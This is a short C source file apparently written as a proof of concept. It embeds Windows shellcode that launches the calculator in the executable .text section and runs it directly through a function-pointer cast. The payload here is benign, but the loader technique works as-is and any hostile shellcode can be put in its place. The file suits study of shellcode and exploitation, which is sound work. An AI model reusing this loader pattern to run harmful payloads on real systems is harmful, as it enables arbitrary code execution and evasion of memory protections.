//put our shellcode into the .text section. 
#pragma section(".text")

// No need to allocate register for the shellcode
//proof of concept open calculator shellcode
__declspec(allocate(".text")) char shellcode_opencalc[] =
"\x31\xc9\xf7\xe1\x64\x8b\x41"
"\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b"
"\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
"\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
"\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78"
"\x0a\x72\x65\x73\x73\x75\xeb\x8b\x72\x24\x01"
"\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde"
"\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x68\x73"
"\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68"
"\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43"
"\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\xb1\xff"
"\x31\xff\x57\xe2\xfd\x68\x63\x61\x6c\x63\x89"
"\xe1\x51\x51\x31\xd2\x52\x52\x52\x52\x52\x52"
"\x51\x52\xff\xd0\x83\xc4\x10\x68\x65\x73\x73"
"\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd5\x31"
"\xc9\x51\xff\xd0";

int main()
{
    //cast to func_ptr so we can run it directly without needing windows API to jump to it
    (*(void(*)())(&shellcode_opencalc))();
}